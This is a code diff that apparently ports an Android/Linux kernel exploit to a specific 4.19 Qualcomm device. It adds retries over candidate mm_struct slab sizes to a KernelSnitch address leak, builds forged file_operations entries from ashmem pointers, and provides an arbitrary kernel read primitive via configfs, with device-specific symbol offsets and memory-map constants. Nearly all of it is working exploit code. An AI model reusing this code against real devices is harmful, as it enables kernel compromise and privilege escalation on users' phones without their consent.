@@ -46,7 +46,41 @@
  #define VMEMMAP_END (VMEMMAP_START + DIRECT_MAP_PAGES * STRUCT_PAGE_SIZE)
 --- a/util.c
 +++ b/util.c
-@@ -286,10 +286,19 @@
+@@ -32,8 +32,33 @@
+   return kernelsnitch_found_collisions(ks);
+ }
+ 
++/* candidate SLUB object sizes for the mm_struct cache (ALIGN to cacheline) */
++static const size_t ksnitch_mm_sizes[] = {
++  0x380, 0x358, 0x400, 0x360, 0x300, 0x3c0, 0x340, 0x480,
++};
+ void run_kernelsnitch_bruteforce(void) {
+   kernelsnitch_bruteforce(ks);
++  if (ks->mm_struct != (size_t)-1) {
++    return;
++  }
++  for (size_t i = 0; i < sizeof(ksnitch_mm_sizes) / sizeof(ksnitch_mm_sizes[0]);
++       i++) {
++    if (ksnitch_mm_sizes[i] == MM_STRUCT_SZ) {
++      continue;
++    }
++    ks->state = KERNELSNITCH_COLLISIONS_FOUND;
++    ks->mm_struct = (size_t)-1;
++    ks->found = 0;
++    ks->mm_struct_sz = ksnitch_mm_sizes[i];
++    ks->mm_slab_order = 0;
++    pr_info("KernelSnitch retry mm_struct_sz=0x%zx\n", ksnitch_mm_sizes[i]);
++    kernelsnitch_bruteforce(ks);
++    if (ks->mm_struct != (size_t)-1) {
++      pr_info("KernelSnitch mm found with mm_struct_sz=0x%zx addr=%016zx\n",
++              ksnitch_mm_sizes[i], ks->mm_struct);
++      return;
++    }
++  }
+ }
+ 
+ uintptr_t current_kernelsnitch_mm_struct(void) {
+@@ -286,10 +311,19 @@
    put64(p, off + FOPS_OWNER_OFF, 0);
    put64(p, off + FOPS_LLSEEK_OFF,
          fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
@@ -66,7 +100,16 @@
    put64(p, off + FOPS_IOCTL_OFF, text_addr(ASHMEM_IOCTL));
    put64(p, off + FOPS_COMPAT_IOCTL_OFF, text_addr(ASHMEM_COMPAT_IOCTL));
    put64(p, off + FOPS_MMAP_OFF, text_addr(ASHMEM_MMAP));
-@@ -730,6 +739,24 @@
+@@ -598,7 +632,7 @@
+     return 0;
+   }
+ 
+-  kernelsnitch_bruteforce(ks);
++  run_kernelsnitch_bruteforce();
+   uintptr_t leaked = ks->mm_struct;
+   if (leaked == (uintptr_t)-1) {
+     pr_warning("KernelSnitch mm_struct leak failed\n");
+@@ -730,6 +764,24 @@
  ssize_t configfs_read_once(int fd, uintptr_t target, void *data, size_t len) {
    unsigned char blob[128];
    memset(blob, 0, sizeof(blob));
@@ -91,7 +134,7 @@
    off_t pos = (off_t)(ASHMEM_PREFIX_COUNT - len);
    uintptr_t page = target - (uintptr_t)pos;
    put64(blob, CFG_PAGE_OFF - ASHMEM_NAME_PREFIX_LEN, page);
-@@ -745,6 +772,7 @@
+@@ -745,6 +797,7 @@
    errno = 0;
    ssize_t rd = pread(fd, data, len, pos);
    return rd;
@@ -99,7 +142,7 @@
  }
  
  int is_kernel_ptr(uintptr_t value) {
-@@ -771,3 +799,67 @@
+@@ -771,3 +824,67 @@
  ssize_t kernel_read_data(int fd, uintptr_t target, void *data, size_t len) {
    return configfs_read_once(fd, target, data, len);
  }
@@ -318,6 +361,27 @@
 +#define pr_warning(fmt, ...) exlog_writef("-", fmt, ##__VA_ARGS__)
 +#define pr_info(fmt, ...) exlog_writef("*", fmt, ##__VA_ARGS__)
 +#define pr_success(fmt, ...) exlog_writef("+", fmt, ##__VA_ARGS__)
+--- a/kernelsnitch/kernelsnitch.h
++++ b/kernelsnitch/kernelsnitch.h
+@@ -200,12 +200,15 @@
+     struct kernelsnitch_shared_state *ks = mm_leak_arg->ks;
+     struct range *range = &mm_leak_arg->range;
+     if (ks->verbose) pr_info("[% 3zd] start finding mm_struct [%016zx-%016zx]\n", range->id, range->start, range->end);
+-    size_t mm_slab_sz = KS_PAGE_SIZE << ks->mm_slab_order;
+     for (size_t coarse_addr = range->start; (coarse_addr < range->end) && !ks->found; coarse_addr += COARSE_SZ) {
+         if ((coarse_addr % (1ULL << 40)) == 0)
+             if (ks->verbose) pr_info("[% 3zd] [%016zx-%016llx]\n", range->id, coarse_addr, coarse_addr + (1ULL << 40));
+-        for (size_t slab_addr = coarse_addr; (slab_addr < coarse_addr + COARSE_SZ) && !ks->found; slab_addr += mm_slab_sz) {
+-            for (size_t mm_struct_candidate = slab_addr; (mm_struct_candidate < slab_addr + mm_slab_sz) && !ks->found; mm_struct_candidate += ks->mm_struct_sz) {
++        {
++            /* fork: continuous scan (no slab-order grouping) so MM_ORDER
++             * cannot create gaps between candidate strides */
++            size_t coarse_end = coarse_addr + COARSE_SZ;
++            if (coarse_end > range->end) coarse_end = range->end;
++            for (size_t mm_struct_candidate = coarse_addr; (mm_struct_candidate < coarse_end) && !ks->found; mm_struct_candidate += ks->mm_struct_sz) {
+ 
+                 size_t found_hash = 1;
+                 if (!ks->mte_enabled) {
 --- a/preload.c
 +++ b/preload.c
 @@ -394,11 +394,13 @@
@@ -370,9 +434,9 @@
 +#define P0_PHYS_OFFSET 0x80000000ULL                    /* [D] qcom standard; verify /proc/iomem */
 +#define P0_KERNEL_PHYS_LOAD 0x80080000ULL               /* [B] PHYS + Image text_offset 0x80000 */
 +#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
-+#define KERNELSNITCH_IDENTITY_END 0xffffff9000000000ULL /* [D] 4GB window, tune to RAM size */
++#define KERNELSNITCH_IDENTITY_END 0xffffffc000000000ULL /* [B] 16GB window (K40 6/8/12GB RAM) */
 +#define DIRECT_MAP_BASE 0xffffff8000000000ULL
-+#define DIRECT_MAP_END 0xffffff9000000000ULL            /* [D] idem */
++#define DIRECT_MAP_END 0xffffffc000000000ULL            /* [B] 16GB */
 +#define VMEMMAP_START 0xffffffbc00000000ULL             /* [B] 4.19 39-bit layout (NOT 6.x 0xfffffffe..) */
 +
 +#define PSELECT_WAITER_WORD_SHIFT 1                     /* [D] stack-frame tuning, confirm at runtime */
@@ -385,7 +449,9 @@
 +#define KMALLOC_CACHE_TYPES 3      /* 4.19 NR_KMALLOC_TYPES */
 +#define ASHMEM_NAME_PREFIX_LEN 0   /* this kernel's ashmem has NO "/dev/ashmem" prefix (binary-verified) */
 +#define ASHMEM_PREFIX_COUNT 0      /* 6.x prefix arithmetic disabled on 4.19 */
-+#define MM_STRUCT_SZ 0x358         /* this kernel's sizeof(struct mm_struct); slab order TBD at runtime */
++/* sizeof(mm_struct)=0x358; SLAB_HWCACHE_ALIGN rounds to 64 -> real object 0x380.
++ * util.c retries a few sizes at runtime, so this is a starting guess only. */
++#define MM_STRUCT_SZ 0x380
 +
 +/* ---------------- symbol offsets (off = sym - KIMAGE_TEXT_BASE) ---------------- */
 +#define ASHMEM_MISC_FOPS_OFF 0x02ed2c60ULL              /* [A] ashmem_misc + 0x10 = miscdevice.fops slot */
